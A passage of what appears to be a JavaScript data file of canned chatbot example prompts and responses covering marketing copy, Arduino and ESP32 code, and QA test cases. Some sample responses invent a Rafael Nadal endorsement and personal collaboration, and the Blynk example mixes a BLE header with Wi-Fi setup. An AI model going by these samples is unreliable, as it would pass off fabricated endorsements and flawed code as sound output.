                'Sure, here\'s a Twitter thread based on an online sport training program that is recommended by Rafael Nadal:\n\nTweet 1: Are you looking to improve your athletic performance? Look no further than the online sport training program recommended by none other than tennis superstar Rafael Nadal!\n\nTweet 2: This online training program covers a wide range of sports and is designed by some of the best coaches in the world, to help athletes improve their skills, strength, and stamina.\n\nTweet 3: Whether you\'re a pro-athlete or an amateur, this training program caters to every level of athlete. You can choose from a range of customizable training plans that are tailored to your individual needs.\n\nTweet 4: With this training program, you\'ll gain access to some of the best training facilities around the world, along with expert guidance from top coaches, nutritionists, and fitness trainers.\n\nTweet 5: Rafael Nadal has personally collaborated with the coaches behind this online training program, to ensure that it is of the highest standard and will help you achieve your athletic goals.\n\nTweet 6: Don\'t wait any longer to take your athletic performance to the next level! Sign up for the online sport training program recommended by Rafael Nadal and join the countless athletes who have already seen results. #TrainLikeNadal\n\nTweet 7: So, whether you want to improve your tennis swing, run a faster mile, or increase your overall fitness, this online training program will help you achieve your goals. Sign up now and start your journey to success! #TrainLikeNadal',
            },
          },
        ],
      },
      {
        shortTitle: 'AB',
        title: 'A/B Testing',
        examples: [
          {
            request: [
              {
                content: 'Respond with a A/B testing for the next User Story',
                role: 'system',
              },
              {
                content:
                  'As a user, I want to be able to log into the application with my email and password so that I can access all of the features that require authentication.',
                role: 'user',
              },
            ],
            response: {
              content:
                'A/B testing: \n\nA) Traditional login method where users enter their email and password into a login form and click a button to authenticate their credentials.\n\nB) Social media login method where users can choose to log in using their social media account credentials (e.g. Facebook, Google, Twitter). \n\nThe A/B testing will measure which method generates more logins, higher user engagement, and user satisfaction.',
            },
          },
          {
            request: [
              {
                content: 'Respond with a A/B testing for the next User Story',
                role: 'system',
              },
              {
                content: 'As a customer, I want to be able to add a product to my cart so that I can purchase it later',
                role: 'user',
              },
            ],
            response: {
              content:
                'As an A/B testing variation for this user story, we can test the placement and design of the "Add to Cart" button. In variation A, the "Add to Cart" button can be placed prominently in the center of the product page with a contrasting color to make it stand out. This could help attract the user\'s attention and make it easier for them to add products to their cart.\n\nIn variation B, we could move the "Add to Cart" button to a less prominent location, such as in the corner of the product page. This could test if users are more likely to add products to their cart if they have to actively search for the button, rather than having it prominently displayed.\n\nWe can then track metrics such as the number of products added to the cart, the click-through rate on the "Add to Cart" button, and the conversion rate to determine which variation is more effective.',
            },
          },
        ],
      },
      {
        shortTitle: 'PD',
        title: 'Product Description',
        examples: [
          {
            request: [
              {
                content: 'I want you to act as a marketing specialist',
                role: 'system',
              },
              {
                content: 'Can you create a product descrition for an online spinning classes',
                role: 'user',
              },
            ],
            response: {
              content:
                'Sure, here\'s a product description for an online spinning class:\n\nIntroducing our online spinning class! Are you tired of the same old workout routine? Looking for a fun and energizing way to get your heart pumping and burn some serious calories? Look no further than our online spinning class!\n\nWith top-rated instructors and the latest in stationary bike technology, our online spinning class delivers a high-intensity cardio workout that is perfect for anyone looking to take their fitness to the next level. Whether you\'re a seasoned athlete or just starting out on your fitness journey, our classes are designed to provide a challenging and invigorating workout that will leave you feeling stronger, healthier, and more energized than ever before!\n\nOur immersive virtual studios bring the energy and excitement of a traditional spin class right to your home. With live and on-demand classes available to fit any schedule, you can spin your way to your health and fitness goals anytime, anywhere.\n\nSo why wait? Sign up for our online spinning class today and start experiencing the best workout of your life!',
            },
          },
          {
            request: [
              {
                content: 'I want you to act as a marketing specialist',
                role: 'system',
              },
              {
                content: 'Can you create a product description for a tennis racket recommended by Rafael Nadal',
                role: 'user',
              },
            ],
            response: {
              content:
                '\n\nIntroducing the ultimate tennis racket, recommended by none other than the tennis legend Rafael Nadal himself. This high-performance racket has been designed to meet the needs of serious players who demand the best, no matter their skill level.\n\nCrafted from top-quality materials, this tennis racket boasts a sturdy and durable frame that can withstand even the most intense gameplay. The design incorporates the latest technology in racquet construction, resulting in unparalleled accuracy and power.\n\nYou\'ll feel like a pro when you hold this racket, thanks to its comfortable grip and balanced weight distribution. The special stringing pattern adds more control to your shots, allowing you to dominate the court with ease.\n\nDesigned to meet the needs of both beginner and advanced players, this tennis racket is a must-have for any player looking to improve their game. Don\'t miss out on this opportunity to take your tennis skills to the next level - order now and experience the power of Rafael Nadal\'s favourite tennis racket!',
            },
          },
        ],
      },
    ],
  },

  {
    type: '--collection-main--category-studios--subcategory-digital--subcategory_level_2-digital-sales--',
    mode: [
      {
        shortTitle: 'GA',
        title: 'Google Ads',
        examples: [
          {
            request: [
              {
                content: 'I want you to act as a marketing specialist',
                role: 'system',
              },
              {
                content: 'give 10 keywords ideas for credit card to add in google ads',
                role: 'user',
              },
            ],
            response: {
              content:
                '\n\n1. Cashback Credit Cards\n2. Travel Reward Credit Cards\n3. No Annual Fee Credit Cards\n4. Balance Transfer Credit Cards\n5. Low Interest Credit Cards\n6. Student Credit Cards\n7. Secured Credit Cards\n8. Premium Credit Cards\n9. Business Credit Cards\n10. Airline Miles Credit Cards',
            },
          },
          {
            request: [
              {
                content: 'I want you to act as a marketing specialist',
                role: 'system',
              },
              {
                content: 'Give me 10 titles with less than 30 characters for my No Annual Fee Credit Cards',
                role: 'user',
              },
            ],
            response: {
              content:
                '1. FeeFree \n2. NoXtraFee \n3. NoAnnual \n4. Cashless \n5. ZeroFee \n6. SaveMoney \n7. PayLess \n8. CardFree \n9. MoneyWise \n10. BudgetCard',
            },
          },
        ],
      },

      {
        shortTitle: 'EM',
        title: 'Email Marketing',
        examples: [
          {
            request: [
              {
                content: 'I want you to act as a marketing specialist',
                role: 'system',
              },
              {
                content:
                  'can you create me a sales email to a cold audience offering an online sport training that has 90 day money back guarantee and is only $29,99',
                role: 'user',
              },
            ],
            response: {
              content:
                'Subject: Take Your Athletic Performance to the Next Level with Our Online Sport Training Program\n\nDear [First Name],\n\nAre you tired of not seeing results in your sport performance? Do you want to take your skills to the next level?\n\nOur online sport training program can help you achieve your goals. We offer comprehensive training in your sport - from basketball to football and everything in between. Our training program is designed specifically to help you achieve your personal best and gives you the tools to succeed in your sport.\n\nWe understand that life can be unpredictable and that\'s why we\'re proud to offer a 90-day money-back guarantee. We\'re confident in our program and we know that you\'ll see results too.\n\nAnd best of all, our program is only $29.99 - that\'s less than a dollar per day for expert online training.\n\nOur program will help you:\n\n- Improve your agility and quickness\n- Boost your speed and endurance\n- Develop proper technique and form\n- Increase your strength and power\n- Enhance your mental toughness and confidence\n\nWe know that you\'re serious about your sport and we want to help you succeed. Our online sport training program is here to help you achieve your goals.\n\nDon\'t wait any longer, sign up today and start your journey towards becoming a better athlete.\n\nSincerely,\n\n[Your Name]',
            },
          },
          {
            request: [
              {
                content: 'I want you to act as a marketing specialist',
                role: 'system',
              },
              {
                content:
                  'can you create me a marketing mail for a user purchased the online training on the application yesterday.',
                role: 'user',
              },
            ],
            response: {
              content:
                'Dear [Name],\n\nWe hope this message finds you well. We wanted to take a moment to thank you for choosing to enhance your skills through our online training program on [Application Name].\n\nWe understand how challenging it can be to learn new skills in today\'s fast-paced world, and we commend you for taking the initiative to invest in yourself. Our online training program is designed to help you achieve your personal and professional development goals, and we are thrilled to have you as a part of our community.\n\nAs a new member, we want to ensure that you have access to all the tools and resources required for your success. Therefore, we have prepared a welcome guide that outlines everything you need to know to get started with our online training program. \n\nThis guide includes details about your program, best practices for studying effectively, and how to prepare for your assessments. And if you ever need additional support along the way, you can always reach out to our customer service team. \n\nThank you again for trusting us with your education, and don\'t hesitate to let us know how we can help you succeed. We look forward to partnering with you on this exciting journey.\n\nSincerely,\n\n[Your Name]\n\nMarketing Specialist at [Application Name]',
            },
          },
        ],
      },
      {
        shortTitle: 'SM',
        title: 'Social Media',
        examples: [
          {
            request: [
              {
                content: 'I want you to act as a marketing specialist',
                role: 'system',
              },
              {
                content: 'can you create a social media post based in a online sport training program',
                role: 'user',
              },
            ],
            response: {
              content:
                'Sure, here\'s a sample social media post promoting an online sport training program:\n\n"Level up your game with our online sport training program! Train with top coaches who know what it takes to win. Tailor your workouts to your specific sport and skill level. Boost your speed, strength and agility all from the comfort of your home. Get ready to dominate on the field or court. Sign up now and join the winning team! 🏆👊 #SportTraining #OnlineTraining #WinningTeam"',
            },
          },
          {
            request: [
              {
                content: 'I want you to act as a marketing specialist',
                role: 'system',
              },
              {
                content:
                  'can you create a social media post based in a online sport training program that is recomended by Rafael Nadal',
                role: 'user',
              },
            ],
            response: {
              content:
                '\n\nAttention all sports enthusiasts! 🏆 \n\nAre you ready to take your game to the next level? 🚀 Look no further than the online sport training program recommended by none other than tennis legend Rafael Nadal himself! 🎾\n\nWith personalized training sessions and top-notch instruction from some of the world\'s best coaches, this program is the perfect way to achieve your athletic goals. Plus, it\'s all online, so you can work out from the comfort of your own home! 🏠\n\nDon\'t let another day go by without reaching your full potential. Join the program trusted by the pros - sign up today and get ready to crush your fitness goals! 💪 #TrainLikeNadal #OnlineSportTraining #AthleticGoals #FitnessJourney.',
            },
          },
        ],
      },
      {
        shortTitle: 'TW',
        title: 'Twitter Messages',
        examples: [
          {
            request: [
              {
                content: 'I want you to act as a marketing specialist',
                role: 'system',
              },
              {
                content: 'Can you create a Twit bases in online sport training program',
                role: 'user',
              },
            ],
            response: {
              content:
                '\n\nAbsolutely! Here is a possible tweet to promote an online sports training program:\n\n"Take your game to the next level with our online sports training program! Access personalized workouts, track your progress, and connect with expert coaches, all from the comfort of your home. Sign up now and start dominating the competition. #sports #training #online"',
            },
          },
          {
            request: [
              {
                content: 'I want you to act as a marketing specialist',
                role: 'system',
              },
              {
                content:
                  'Can you create a Twitter thread bases in online sport training program that is recomended by Rafael Nadal',
                role: 'user',
              },
            ],
            response: {
              content:
                'Sure, here\'s a Twitter thread based on an online sport training program that is recommended by Rafael Nadal:\n\nTweet 1: Are you looking to improve your athletic performance? Look no further than the online sport training program recommended by none other than tennis superstar Rafael Nadal!\n\nTweet 2: This online training program covers a wide range of sports and is designed by some of the best coaches in the world, to help athletes improve their skills, strength, and stamina.\n\nTweet 3: Whether you\'re a pro-athlete or an amateur, this training program caters to every level of athlete. You can choose from a range of customizable training plans that are tailored to your individual needs.\n\nTweet 4: With this training program, you\'ll gain access to some of the best training facilities around the world, along with expert guidance from top coaches, nutritionists, and fitness trainers.\n\nTweet 5: Rafael Nadal has personally collaborated with the coaches behind this online training program, to ensure that it is of the highest standard and will help you achieve your athletic goals.\n\nTweet 6: Don\'t wait any longer to take your athletic performance to the next level! Sign up for the online sport training program recommended by Rafael Nadal and join the countless athletes who have already seen results. #TrainLikeNadal\n\nTweet 7: So, whether you want to improve your tennis swing, run a faster mile, or increase your overall fitness, this online training program will help you achieve your goals. Sign up now and start your journey to success! #TrainLikeNadal',
            },
          },
        ],
      },
      {
        shortTitle: 'AB',
        title: 'A/B Testing',
        examples: [
          {
            request: [
              {
                content: 'Respond with a A/B testing for the next User Story',
                role: 'system',
              },
              {
                content:
                  'As a user, I want to be able to log into the application with my email and password so that I can access all of the features that require authentication.',
                role: 'user',
              },
            ],
            response: {
              content:
                'A/B testing: \n\nA) Traditional login method where users enter their email and password into a login form and click a button to authenticate their credentials.\n\nB) Social media login method where users can choose to log in using their social media account credentials (e.g. Facebook, Google, Twitter). \n\nThe A/B testing will measure which method generates more logins, higher user engagement, and user satisfaction.',
            },
          },
          {
            request: [
              {
                content: 'Respond with a A/B testing for the next User Story',
                role: 'system',
              },
              {
                content: 'As a customer, I want to be able to add a product to my cart so that I can purchase it later',
                role: 'user',
              },
            ],
            response: {
              content:
                'As an A/B testing variation for this user story, we can test the placement and design of the "Add to Cart" button. In variation A, the "Add to Cart" button can be placed prominently in the center of the product page with a contrasting color to make it stand out. This could help attract the user\'s attention and make it easier for them to add products to their cart.\n\nIn variation B, we could move the "Add to Cart" button to a less prominent location, such as in the corner of the product page. This could test if users are more likely to add products to their cart if they have to actively search for the button, rather than having it prominently displayed.\n\nWe can then track metrics such as the number of products added to the cart, the click-through rate on the "Add to Cart" button, and the conversion rate to determine which variation is more effective.',
            },
          },
        ],
      },
      {
        shortTitle: 'PD',
        title: 'Product Description',
        examples: [
          {
            request: [
              {
                content: 'I want you to act as a marketing specialist',
                role: 'system',
              },
              {
                content: 'Can you create a product descrition for an online spinning classes',
                role: 'user',
              },
            ],
            response: {
              content:
                'Sure, here\'s a product description for an online spinning class:\n\nIntroducing our online spinning class! Are you tired of the same old workout routine? Looking for a fun and energizing way to get your heart pumping and burn some serious calories? Look no further than our online spinning class!\n\nWith top-rated instructors and the latest in stationary bike technology, our online spinning class delivers a high-intensity cardio workout that is perfect for anyone looking to take their fitness to the next level. Whether you\'re a seasoned athlete or just starting out on your fitness journey, our classes are designed to provide a challenging and invigorating workout that will leave you feeling stronger, healthier, and more energized than ever before!\n\nOur immersive virtual studios bring the energy and excitement of a traditional spin class right to your home. With live and on-demand classes available to fit any schedule, you can spin your way to your health and fitness goals anytime, anywhere.\n\nSo why wait? Sign up for our online spinning class today and start experiencing the best workout of your life!',
            },
          },
          {
            request: [
              {
                content: 'I want you to act as a marketing specialist',
                role: 'system',
              },
              {
                content: 'Can you create a product description for a tennis racket recommended by Rafael Nadal',
                role: 'user',
              },
            ],
            response: {
              content:
                '\n\nIntroducing the ultimate tennis racket, recommended by none other than the tennis legend Rafael Nadal himself. This high-performance racket has been designed to meet the needs of serious players who demand the best, no matter their skill level.\n\nCrafted from top-quality materials, this tennis racket boasts a sturdy and durable frame that can withstand even the most intense gameplay. The design incorporates the latest technology in racquet construction, resulting in unparalleled accuracy and power.\n\nYou\'ll feel like a pro when you hold this racket, thanks to its comfortable grip and balanced weight distribution. The special stringing pattern adds more control to your shots, allowing you to dominate the court with ease.\n\nDesigned to meet the needs of both beginner and advanced players, this tennis racket is a must-have for any player looking to improve their game. Don\'t miss out on this opportunity to take your tennis skills to the next level - order now and experience the power of Rafael Nadal\'s favourite tennis racket!',
            },
          },
        ],
      },
    ],
  },

  {
    type: '--collection-main--category-studios--subcategory-digital--subcategory_level_2-internet-of-things--',
    mode: [
      {
        shortTitle: 'AC',
        title: 'Arducino Code',
        examples: [
          {
            request: [
              {
                content: 'Reply only the code and nothing else. Do not write explanations.',
                role: 'system',
              },
              {
                content: 'write a code to blink led in Arduino',
                role: 'user',
              },
            ],
            response: {
              content:
                '\n\nvoid setup(){\n   pinMode(LED_BUILTIN, OUTPUT); // Initialize the LED pin as an output\n}\n\nvoid loop(){\n   digitalWrite(LED_BUILTIN, HIGH); // Turn the LED on\n   delay(1000); // Wait for one second\n   digitalWrite(LED_BUILTIN, LOW); // Turn the LED off\n   delay(1000); // Wait for one second\n}',
            },
          },
          {
            request: [
              {
                content: 'Reply only the code and nothing else. Do not write explanations.',
                role: 'system',
              },
              {
                content: 'Write a code to blink led at pin 10 with a delay of 10 seconds in Arduino',
                role: 'user',
              },
            ],
            response: {
              content:
                'void setup() {\n  pinMode(10, OUTPUT);\n}\n\nvoid loop() {\n  digitalWrite(10, HIGH);\n  delay(10000);\n  digitalWrite(10, LOW);\n  delay(10000);\n}',
            },
          },
        ],
      },

      {
        shortTitle: 'MA',
        title: 'More Arduino',
        examples: [
          {
            request: [
              {
                content: 'Reply only the code and nothing else. Do not write explanations.',
                role: 'system',
              },
              {
                content: 'Write a code to connect esp32 with wifi in Arduino',
                role: 'user',
              },
            ],
            response: {
              content:
                '\n\n```\n#include <WiFi.h>\n\nconst char* SSID = "your_SSID";\nconst char* PASSWORD = "your_PASSWORD";\n\nvoid setup() {\n  Serial.begin(9600);\n  WiFi.begin(SSID, PASSWORD);\n  while (WiFi.status() != WL_CONNECTED) {\n    delay(1000);\n    Serial.println("Connecting to WiFi...");\n  }\n  Serial.println("Connected to WiFi");\n}\n\nvoid loop() {\n  // put your main code here, to run repeatedly:\n}\n```',
            },
          },
          {
            request: [
              {
                content: 'Reply only the code and nothing else. Do not write explanations.',
                role: 'system',
              },
              {
                content: 'write a code to control virtual pin V2 of blynk iot cloud on esp32 using ardino ide',
                role: 'user',
              },
            ],
            response: {
              content:
                '```\n#define BLYNK_TEMPLATE_ID "your_template_id"\n#define BLYNK_DEVICE_NAME "your_device_name"\n#define BLYNK_AUTH_TOKEN "your_auth_token"\n\n#include <WiFi.h>\n#include <WiFiClient.h>\n#include <BlynkSimpleEsp32_BLE.h>\n\nchar auth[] = BLYNK_AUTH_TOKEN;\nchar ssid[] = "your_SSID";\nchar pass[] = "your_PASSWORD";\n\nvoid setup()\n{\n  Blynk.begin(auth, ssid, pass);\n}\n\nvoid loop()\n{\n  Blynk.virtualWrite(V2, 0); //Turn off virtual pin V2\n  delay(1000);\n  Blynk.virtualWrite(V2, 1); //Turn on virtual pin V2\n  delay(1000);\n}\n```',
            },
          },
        ],
      },
      {
        shortTitle: 'FA',
        title: 'FAQ',
        examples: [
          {
            request: [
              {
                content: 'I want you to act as a internet of things specialist',
                role: 'system',
              },
              {
                content: 'Suggest me some microcontroller board for IOT project',
                role: 'user',
              },
            ],
            response: {
              content:
                '\n\nThere are many different microcontroller boards available for IoT projects. Here are few examples:\n\n1. Arduino: Arduino is a popular and affordable microcontroller board, which can be used for creating IoT applications. It is available in different forms like Uno, Nano, Mega, and Due.\n\n2. Raspberry Pi: The Raspberry Pi board is a single-board computer that is widely used in IoT projects. It is popular for its low cost, small size, and versatility. It can run various operating systems, including Linux and Windows.\n\n3. NodeMCU: NodeMCU is an open-source Wi-Fi development board that is based on the ESP8266 microcontroller. It is used for developing applications related to the Internet of Things.\n\n4. ESP32: The ESP32 is a very powerful microcontroller board that can be used for IoT projects. It has Wi-Fi and Bluetooth capabilities, which make it suitable for developing wireless IoT applications.\n\n5. Particle Argon: Particle Argon is a powerful IoT development kit that includes Wi-Fi and Bluetooth capabilities. It is based on the Nordic nRF52840 chip and is suitable for developing IoT applications that require wireless connectivity.\n\nThese are just a few examples of microcontroller boards that can be used for IoT projects. The choice of which board to use will depend on your specific needs and requirements.',
            },
          },
          {
            request: [
              {
                content: 'I want you to act as a internet of things specialist',
                role: 'system',
              },
              {
                content: 'is ESP32 better than Arduino',
                role: 'user',
              },
            ],
            response: {
              content:
                'ESP32 and Arduino are different types of development boards that serve different purposes. \n\nArduino is a microcontroller board that is widely used for prototyping and creating simple to complex electronic projects. It has a large community of users, and there are many libraries and resources available to help you get started with programming.\n\nESP32 is a low-cost, low-power consumption Wi-Fi and Bluetooth-enabled development board that has the capabilities of both a microcontroller and a Wi-Fi/Bluetooth module. It is ideal for IoT projects and can connect to the internet via Wi-Fi. ESP32 is known for its low power consumption and good performance.\n\nIn terms of which one is better, it really depends on your project requirements. If you need to connect to the internet or use Bluetooth in your project, then ESP32 is the better option. If you\'re looking for a simple and easy-to-use board for prototyping, then Arduino might be a better choice. Ultimately, it\'s important to assess your project needs and choose the board that fits those needs best.',
            },
          },
        ],
      },
      {
        shortTitle: 'F2',
        title: 'FAQ2',
        examples: [
          {
            request: [
              {
                content: 'I want you to act as a internet of things specialist',
                role: 'system',
              },
              {
                content: 'What happens if I connect ESP32 with 1kV AC power',
                role: 'user',
              },
            ],
            response: {
              content:
                '\n\nIt is not recommended to connect an ESP32 with 1kV AC power as it can damage the device and potentially cause harm to the user. The ESP32 is designed to work with low voltage DC power sources and should be powered accordingly. If high voltage AC power is required, appropriate safety measures must be taken, and a power converter or transformer should be used to step down the voltage to a safe level for the ESP32 to operate. It is important to follow proper electrical safety procedures and consult with an experienced electrician or engineer before attempting any high-voltage connections.',
            },
          },
          {
            request: [
              {
                content: 'I want you to act as a internet of things specialist',
                role: 'system',
              },
              {
                content: 'what do you think about Matter protocol in IOT',
                role: 'user',
              },
            ],
            response: {
              content:
                'As an AI language model, I do not have personal opinions, but I can provide you with some information about the Matter protocol in IoT. \n\nThe Matter protocol, formerly known as Project CHIP (Connected Home over IP), is a new standard for smart home devices that aims to make them more secure, reliable, and interoperable across different ecosystems. It\'s designed to simplify the development of IoT devices by providing a universal, open-source standard that can work with a variety of smart home platforms, including Amazon Alexa, Apple HomeKit, and Google Assistant.\n\nOne of the key benefits of the Matter protocol is that it uses a common language between devices, allowing them to communicate seamlessly with each other. This will enable users to mix and match devices from different brands, without worrying about compatibility issues. Additionally, the protocol offers enhanced security features to protect users from hacking and other cybersecurity threats.\n\nOverall, the Matter protocol has the potential to revolutionize the IoT industry by improving device interoperability and security. However, its success will depend on how widely it is adopted by device manufacturers and smart home platforms.',
            },
          },
        ],
      },
    ],
  },

  {
    type: '--collection-main--category-studios--subcategory-digital--subcategory_level_2-quality-engineering--',
    mode: [
      {
        shortTitle: 'TC',
        title: 'Test Cases',
        examples: [
          {
            request: [
              {
                content: 'I want you to act as a software quality assurance tester for a software application',
                role: 'system',
              },
              {
                content: 'write the test cases for the login functionality',
                role: 'user',
              },
            ],
            response: {
              content:
                '\n\nSure, here are some test cases for the login functionality:\n\n1. Invalid Credentials: The login should fail if the user enters invalid credentials, such as the wrong username or password. The system should display an error message.\n\n2. Empty Credentials: The login should fail if the user leaves the username or password fields empty. The system should display an error message.\n\n3. Valid Credentials: The login should succeed if the user enters valid credentials. The system should redirect the user to the home page.\n\n4. Case Sensitivity: The login should be case sensitive. The system should not accept a username or password that is entered in the wrong case.\n\n5. Maximum login attempts: There should be a maximum number of login attempts, after which the user is locked out. The system should display an error message after the maximum attempts have been reached.\n\n6. Account Lockout: After a certain number of failed login attempts, the user\'s account should be locked out for a specified time period. The system should display a message with the remaining time for the account to unlock.\n\n7. Cancel button: The login screen should have a cancel button that takes the user back to the home page without login.\n\n8. Session timeout: The system should automatically log out a user if there is no activity for a set period of time. The system should redirect the user to the login page upon timeout.\n\n9. Remember me: The login screen should have a checkbox to allow the user to save their login information. On subsequent logins, the system should automatically populate the username and password.\n\n10. Multiple user login: The system should allow multiple users to log in at the same time using different credentials on different browsers or devices.\n\nThese are just a few possible test cases for the login functionality. Depending on the software application, there may be additional test cases that need to be considered.',
            },
          },
          {
            request: [
              {
                content: 'I want you to act as a software quality assurance tester for a software application',
                role: 'system',
              },
              {
                content: 'write the test cases for the payment functionality',
                role: 'user',
              },
            ],
            response: {
              content:
                '\n\nTest Case 1: Payment Method Availability\nTest Objective: To check if all available payment methods are displayed on the checkout page.\n\nPreconditions:\n- User is registered and logged in\n- Items are added to the cart\n- User is on checkout page\n\nSteps:\n1. Check the checkout page for available payment methods\n2. Verify if all the available payment methods are displayed\n3. Ensure that the payment method options are clickable\n4. Click on each payment method option and check the page response to validate the availability of the payment modes\n\nExpected Result: The available payment methods should be displayed, and the options should be clickable. \n\nTest Case 2: Payment Functionality \nTest Objective: To check if a successful payment can be made using a valid payment method.\n\nPreconditions:\n- User is registered and logged in\n- Items are added to the cart\n- User is on checkout page\n- A valid payment method is selected\n\nSteps:\n1. Select a valid payment method\n2. Enter correct payment details (Card number, Card type, Expiry date, CVV code)\n3. Click on the “Pay” button\n4. Check the page response for the successful payment confirmation\n\nExpected Result: Payment should be successful, and the user should receive a confirmation message of a successful purchase.\n\nTest Case 3: Invalid Payment Entry\nTest Objective: To check if an error message is displayed when an invalid payment detail is entered.\n\nPreconditions:\n- User is registered and logged in\n- Items are added to the cart\n- User is on checkout page\n- A valid payment method is selected\n\nSteps:\n1. Select a valid payment method\n2. Enter incorrect payment details (e.g., wrong credit card number or expiry date)\n3. Click on the “Pay” button\n4. Check if the page displays the appropriate error message \n\nExpected Result: Error message should be displayed in accordance with the incorrect payment detail entered.\n\nTest Case 4: Payment Confirmation Email\nTest Objective: To verify if a confirmation email is sent to the user after completing the payment.\n\nPreconditions:\n- User is registered and logged in\n- Items are added to the cart\n- User is on checkout page\n- A valid payment method is selected\n- A valid email address is entered\n\nSteps:\n1. Enter a valid email address on the checkout page\n2. Select a valid payment method\n3. Enter correct payment details (Card number, Card type, Expiry date, CVV code)\n4. Click on the “Pay” button\n5. Check the email inbox for a confirmation email\n\nExpected Result: A confirmation email should be sent to the email address provided, containing details of the purchased product and a confirmation message.',
            },
          },
        ],
      },

      {
        shortTitle: 'FA',
        title: 'FAQ',
        examples: [
          {
            request: [
              {
                content: 'I want you to act as a software quality assurance tester for a software application',
                role: 'system',
              },
              {
                content: 'how to learn automation testing',
                role: 'user',
              },
            ],
            response: {
              content:
                '\n\nThere is no single or straightforward way to learn automation testing, but here are some general steps you can follow:\n\n1. Familiarize yourself with basics of software testing: Before jumping into automation testing, you should have a good understanding of software testing concepts such as test planning, test case development, and test execution. You can start with beginner-level testing courses or tutorials available online.\n\n2. Choose a language: You must choose a programming language that is commonly used for automation testing such as Java, Python, or Ruby.\n\n3. Learn a testing framework: Next, you need to select a test automation framework such as Selenium, Appium, or TestComplete. These frameworks will make it easier to automate GUI interactions, test APIs and create test scripts.\n\n4. Practice: Practice writing test cases on various applications, perform testing and debugging, and evaluate your results.\n\n5. Attend training: Enroll in online courses or attend a training institute where experienced instructors can guide you through the entire process.\n\n6. Keep Learning: As with any technical skill, automation testing requires continuous learning and self-improvement. Stay updated with the latest automation testing trends and best practices by attending webinars and following automation testing blogs.\n\nIn summary, the key to learning automation testing is to have a strong foundation in software testing concepts, select an appropriate programming language and testing framework, and practice, practice, practice!',
            },
          },
          {
            request: [
              {
                content: 'just write code and nothing else. Do not write explanations.',
                role: 'system',
              },
              {
                content: 'First steps to learn selenium',
                role: 'user',
              },
            ],
            response: {
              content:
                '\n\nGreat! Selenium is a popular open source automation testing tool that is used for web application testing. Here are the initial steps to learn Selenium:\n\n1. Learn basic programming concepts: Selenium leverages object-oriented programming languages such as Java, Python, and C#, so it is best to learn the fundamental concepts of any of these languages. You don\'t need to be an expert in programming languages, but a basic understanding of programming concepts such as control flow, variables, loops, functions, and data types will surely help while writing test scripts.\n\n2. Learn Selenium WebDriver: The Selenium WebDriver is the core of Selenium. It is responsible for interacting with the browser and automating actions such as clicking links and entering data. You can start by writing simple WebDriver scripts to automate some basic tasks, such as opening a website, entering text, and clicking a button.\n\n3. Learn about TestNG: TestNG is a testing framework that is widely used for Selenium. It provides multiple features such as the ability to group test cases, parameterizing tests, and running tests in parallel. Learn about TestNG annotations such as @Test, @BeforeMethod, @AfterMethod, and @DataProvider.\n\n4. Learn basic HTML, CSS & JavaScript: As Selenium WebDriver works closely with the HTML DOM elements of a web page to interact and manipulate them, it’s important to have a basic understanding of HTML and CSS. It’s also necessary to have a good understanding of JavaScript as it\'s used to perform JavaScript actions such as document.getElementsByTagName() or document.getElementByName().\n\n5. Learn Selenium IDE: Selenium IDE is a simpler, easier-to-use alternative to WebDriver. It’s an integrated development environment that rapidly creates automated test scripts. Selenium IDE is a good starting point for beginners, and it provides an insight into developing test scripts.\n\n6. Practice, practice, practice: The only key to mastering Selenium is to practice a lot. Write more and more code to automate different types of scenarios, such as login and registration pages, searching for a product, navigating between pages, verifying data on the page, handling alerts, alerts, and pop-ups, etc.\n\nI hope these steps will help you in your journey to learn Selenium. Good luck!',
            },
          },
        ],
      },
      {
        shortTitle: 'SC',
        title: 'Selenium Code',
        examples: [
          {
            request: [
              {
                content: 'I want you to act as a software quality assurance tester for a software application',
                role: 'system',
              },
              {
                content: 'write a selenium code to open flipkart',
                role: 'user',
              },
            ],
            response: {
              content:
                'Sure, here\'s an example code snippet using Selenium WebDriver in Java language to open the Flipkart website:\n\n```java\nimport org.openqa.selenium.WebDriver;\nimport org.openqa.selenium.chrome.ChromeDriver;\n\npublic class FlipkartTest {\n  public static void main(String[] args) {\n    // Set the path of ChromeDriver executable file\n    System.setProperty("webdriver.chrome.driver", "path/to/chromedriver");\n\n    // Create a new instance of ChromeDriver\n    WebDriver driver = new ChromeDriver();\n\n    // Navigate to Flipkart website\n    driver.get("https://www.flipkart.com/");\n\n    // Close the browser window\n    driver.quit();\n  }\n}\n```\n\nYou need to download the latest version of Chromedriver executable file and put it in the specified location before running this code. Alternatively, you can use other web drivers like Firefox Driver, Edge Driver etc. as per your choice',
            },
          },
          {
            request: [
              {
                content: 'I want you to act as a software quality assurance tester for a software application',
                role: 'system',
              },
              {
                content: 'write a seleniun code to test login',
                role: 'user',
              },
            ],
            response: {
              content:
                'Sure, here\'s an example code in Python using Selenium WebDriver to test the login functionality of a web application:\n\n```python\nfrom selenium import webdriver\nfrom selenium.webdriver.common.keys import Keys\n\n# Create a new instance of the Firefox driver\ndriver = webdriver.Firefox()\n\n# navigate to the website\ndriver.get("https://example.com")\n\n# Find the login input fields and enter the username and password\nusername = driver.find_element_by_name("username")\npassword = driver.find_element_by_name("password")\nusername.send_keys("myusername")\npassword.send_keys("mypassword")\n\n# Submit the login form\nlogin_button = driver.find_element_by_name("submit")\nlogin_button.click()\n\n# Wait for the page to load and check if the login was successful\nassert "Welcome" in driver.title\n\n# Close the browser\ndriver.close()\n```\n\nThis code opens a Firefox browser, navigates to the example.com website, enters the username and password in the login input fields, then submits the form by clicking the login button. Finally, it checks if the page title contains the string "Welcome" to verify that the login was successful.',
            },
          },
        ],
      },
      {
        shortTitle: 'SE',
        title: 'Mere Selenium',
        examples: [
          {
            request: [
              {
                content: 'just write code and nothing else. Do not write explanations.',
                role: 'system',
              },
              {
                content: 'provide selenium cript for testing the gym from in webpage in python',
                role: 'user',
              },
            ],
            response: {
              content:
